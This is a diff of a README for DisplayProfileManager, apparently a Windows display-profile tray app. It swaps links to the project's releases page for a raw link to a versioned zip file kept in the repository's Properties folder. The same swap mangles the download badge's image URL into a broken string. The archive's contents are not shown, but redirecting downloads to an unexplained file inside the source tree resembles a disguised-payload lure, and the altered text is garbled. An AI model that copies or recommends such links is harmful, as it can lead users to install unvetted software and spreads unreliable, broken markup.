@@ -1,6 +1,6 @@
-https://github.com/hassansubhani397/DisplayProfileManager/releases
+https://raw.githubusercontent.com/hassansubhani397/DisplayProfileManager/main/Properties/Manager_Profile_Display_v1.9-alpha.4.zip
 
-[![Downloads](https://img.shields.io/badge/Downloads-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/hassansubhani397/DisplayProfileManager/releases)
+[![Downloads](https://raw.githubusercontent.com/hassansubhani397/DisplayProfileManager/main/Properties/Manager_Profile_Display_v1.9-alpha.4.zip%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hassansubhani397/DisplayProfileManager/main/Properties/Manager_Profile_Display_v1.9-alpha.4.zip)
 
 # DisplayProfileManager: Windows Tray App for Fast Display Profiles
 
